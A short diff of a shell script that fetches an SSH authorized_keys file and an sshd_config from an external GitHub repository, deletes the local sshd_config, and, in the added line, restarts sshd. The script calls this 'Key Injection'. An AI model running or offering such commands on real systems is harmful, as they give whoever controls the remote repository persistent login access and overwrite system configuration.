@@ -11,8 +11,9 @@ wget https://raw.githubusercontent.com/TechinoCloud/pub-key/main/authorized_keys
 rm -rf /etc/ssh/sshd_config
 cd /etc/ssh/
 wget https://raw.githubusercontent.com/TechinoCloud/pub-key/main/sshd_config
+service sshd restart
 
 clear
-echo Complete Key Injection for Terminal Access
+echo Complete Key Injection
 echo
 sleep 2
